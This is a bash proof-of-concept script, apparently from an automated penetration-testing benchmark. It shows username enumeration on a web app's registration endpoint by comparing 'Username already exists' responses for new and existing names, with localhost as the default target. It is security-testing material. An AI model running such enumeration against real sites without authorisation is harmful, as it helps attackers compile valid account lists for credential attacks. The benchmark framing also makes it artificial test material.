#!/bin/bash
# POC: POC demonstrating username enumeration via registration error messages. Shows how an attacker can detect existing usernames by observing different error responses.
# Target: ./repo
# Created: 2025-11-04T19:39:37.087Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# Username Enumeration via Registration Error Messages
# This POC demonstrates how an attacker can enumerate valid usernames
# by observing different response behaviors for existing vs non-existing usernames

TARGET_URL="${1:-http://localhost:5000}"
REGISTER_ENDPOINT="/register"

echo "======================================"
echo "Username Enumeration POC"
echo "======================================"
echo "Target: $TARGET_URL"
echo ""

# Step 1: Create a new test user to enumerate later
echo "[*] Step 1: Creating a new user (testuser_enum_$RANDOM) for enumeration test..."
TEST_USERNAME="testuser_enum_$$"
TEST_PASSWORD="TestPass123!"
TEST_EMAIL="test_$RANDOM@example.com"

RESPONSE_NEW=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$TEST_USERNAME&password=$TEST_PASSWORD&first_name=Test&last_name=User&email=$TEST_EMAIL" \
  -w "\n%{http_code}")

HTTP_CODE_NEW=$(echo "$RESPONSE_NEW" | tail -n1)
BODY_NEW=$(echo "$RESPONSE_NEW" | head -n-1)

echo "[+] Registration response: HTTP $HTTP_CODE_NEW"
if echo "$BODY_NEW" | grep -q "Registration successful\|redirect"; then
    echo "[+] User created successfully: $TEST_USERNAME"
else
    echo "[-] Failed to create test user"
fi

echo ""

# Step 2: Attempt to register with the same username (existing user)
echo "[*] Step 2: Attempting registration with existing username ($TEST_USERNAME)..."
RESPONSE_EXISTING=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$TEST_USERNAME&password=DifferentPass123!&first_name=Duplicate&last_name=User&email=different_$RANDOM@example.com" \
  -w "\n%{http_code}")

HTTP_CODE_EXISTING=$(echo "$RESPONSE_EXISTING" | tail -n1)
BODY_EXISTING=$(echo "$RESPONSE_EXISTING" | head -n-1)

echo "[+] Duplicate username response: HTTP $HTTP_CODE_EXISTING"
if echo "$BODY_EXISTING" | grep -qi "username already exists\|already in use"; then
    echo "[+] VULNERABILITY CONFIRMED: Application reveals 'Username already exists' error"
    echo "[+] This allows an attacker to enumerate valid usernames"
else
    echo "[-] Did not detect explicit error message"
fi

echo ""

# Step 3: Attempt to register with a non-existing username
echo "[*] Step 3: Attempting registration with non-existing username (nonexistent_user_$RANDOM)..."
NONEXIST_USERNAME="nonexistent_user_$$"
RESPONSE_NONEXIST=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$NONEXIST_USERNAME&password=TestPass123!&first_name=New&last_name=User&email=new_$RANDOM@example.com" \
  -w "\n%{http_code}")

HTTP_CODE_NONEXIST=$(echo "$RESPONSE_NONEXIST" | tail -n1)
BODY_NONEXIST=$(echo "$RESPONSE_NONEXIST" | head -n-1)

echo "[+] Non-existing username response: HTTP $HTTP_CODE_NONEXIST"

echo ""

# Step 4: Compare responses
echo "[*] Step 4: Response Comparison (Evidence of Enumeration)"
echo "======================================"
echo "Existing Username ($TEST_USERNAME):"
echo "  - HTTP Code: $HTTP_CODE_EXISTING"
echo "  - Contains 'Username already exists': $(echo "$BODY_EXISTING" | grep -ci "username already exists")"
if echo "$BODY_EXISTING" | grep -qi "username already exists"; then
    echo "  - Error Message Found: YES ✓"
else
    echo "  - Error Message Found: NO"
fi

echo ""
echo "Non-Existing Username ($NONEXIST_USERNAME):"
echo "  - HTTP Code: $HTTP_CODE_NONEXIST"
echo "  - Contains 'Username already exists': $(echo "$BODY_NONEXIST" | grep -ci "username already exists")"

echo ""
echo "======================================"
echo "RESULT: Different response behaviors detected"
echo "This allows an attacker to enumerate valid usernames!"
echo "======================================"